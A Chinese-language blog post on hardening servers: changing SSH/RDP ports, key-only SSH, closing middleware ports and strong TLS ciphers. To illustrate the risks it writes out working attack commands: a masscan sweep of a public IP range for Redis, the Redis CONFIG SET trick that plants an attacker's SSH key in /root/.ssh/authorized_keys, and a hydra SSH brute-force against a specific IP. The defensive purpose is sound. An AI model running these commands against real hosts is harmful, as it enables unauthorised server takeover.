---
title: Secure The Server
date: 2020-01-03 08:56:02
categories:
    - Internet
tags:
    - Security
description: "Web Security 至关重要，本文将介绍适合防范黑客攻击，保证服务器的安全"
fancybox: true  # 图片浏览器
toc: true       # 文章目录
original: true  # 文末版权信息 
comments: true  # 文末评论
share: true     # 分享
---

## 修改远程连接端口
例如 windows 的 3389，Linux 的 22 端口。应用服务尽量不要对公网开放，尤其是中间件服务，除了 web 服务所提供的 80，443 端口之外都应该尽量不要对公网开放默认端口，例如 MySQL 的 3306 ，Redis 的 6379 等等。

因为互联网上大量的入侵都是首先扫描到开放这些默认端口的机器，然后在探测是否存在已知的漏洞进而发起攻击。

举个例子，假如入侵者想入侵 redis 3.0 以下版本的 redis，攻击者可以通过 nmap 或 masscan 这类扫描攻击扫描某一个 IP 段是否开放以及根据你的服务器特征探测你的服务器是 Linux 还是 Windows来选择以何种方式发起攻击，以 masscan 为例，探测49.111.0.0/16网段内是否有 redis 服务开启默认 6379 端口。
```
masscan -p6379 49.111.0.0/16 --rate 10000 >> scan.txt
```
然后获取到该网段开放了 6379 端口的 IP，并进行下一步判断其是否有设置密码，版本是否是 3.0 以下。执行如下命令即可查看这台 redis 的相关信息
```
./redis-cli -h IP info
```
然后判断是否设置了密码,如果没有设置密码，通过 redis 的持久化机制将入侵者的公钥写入到/.ssh 目录
```
>config set dir /root/.ssh/
OK
> config set dbfilename authorized_keys
OK
> set xxx "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWuati70x2tsLBJ6FxDgK5NnRhUiIYMHEL9Nt0cwtOvlc8it7Ta9uSzQX6RV3hpF0Txg8/ARZaq75JyzN+1jsNh35mR49YWJloU8FbiI28IjdKAVvCOcAd/WWsPWrRIJPG38Z8Bu2xXBsNCmMwOtPd6VL4k9j6xmeA52PLe4wBJHZbGkPrbTxd7TTtvuWWmbx0dzvXBYCIalhVOJ7u5471tMBoCFGCYh5V8lzS0c4Hm3tf5SuQ8G3vWP8fLE6iUGen9rqBu+QNSxlYJSwz+O5T/ErFTFPZI3USQM7th1r6iY/Z8O7AzZlhXzPCHKcd/+8mzcEJ1JFU8m9gXgF6JwER ubuntu@ubuntu-xenial\n\n\n"
OK
> save
```

## 遭受攻击后采取措施
养成定期更新你的系统和应用软件，因为旧版本软件大多都会存在漏洞被攻击者利用。
尽量不要以管理员权限运行一些应用程序，要以一个普通用户运行指定程序，防止被提权。
禁止密码登录，改为更安全的密钥登录。密钥采用rsa非对称加密算法，并设置大于 2048 位以上密钥，安全系数更高。因为如果采用密码登录，入侵者只要密码字典足够强大，机器运算能力够强是可以非常轻松的破解的，例如通过 hydra 来暴力破解密码
```
hydra -s 22 -v -l root -P pass.txt 49.111.95.153 ssh
```
以 Linux 为例，修改/etc/ssh/sshd_config 中的
```
# 不允许任何人作为根用户登录
PermitRootLogin yes 为 no
# 允许一次登录花费 30 秒；如果超过 30 秒，就不允许访问，必须重新登录。
LoginGraceTime 30

PasswordAuthentication yes 为 no
# 限制最大重试次数为 3 次，3 次之后拒绝登录尝试。
MaxAuthTries 3
# 禁止使用比较弱的协议。
Protocol 2
```

## 最小化对外暴露端口
除非有必要，千万不要将所有端口都设置端口放行为 0.0.0.0/0 这样的规则。
除了 80、443 这样的必须要对外开放访问权限的端口，其他服务都在相对安全的内网环境中运行，这样的优势是除了提升了安全性还防止跨链路带来的带宽损耗，提升访问速度。例如web 服务调用后端 MySQL，如果通过公网访问，速度肯定不及同一个局域网内互相访问的快。

## 在使用 HTTPS 时尽量使用 TLS1.2+版本的协议，并使用加密性非常好的算法。
```
ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+ECDSA+AES128:EECDH+aRSA+AES128:RSA+AES128:EECDH+ECDSA+AES256:EECDH+aRSA+AES256:RSA+AES256:EECDH+ECDSA+3DES:EECDH+aRSA+3DES:RSA+3DES:TLS-CHACHA20-POLY1305-SHA256:TLS-AES-256-GCM-SHA384:TLS-AES-128-GCM-SHA256:EECDH+CHACHA20:EECDH+AESGCM:EECDH+AES:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!KRB5:!aECDH:!EDH+3DES;
```

## 如果遭受 DDOS 攻击，可以考虑购买一些防护服务来解决，避免业务受损。
常见的有 [cloudflare](https://www.cloudflare.com/)
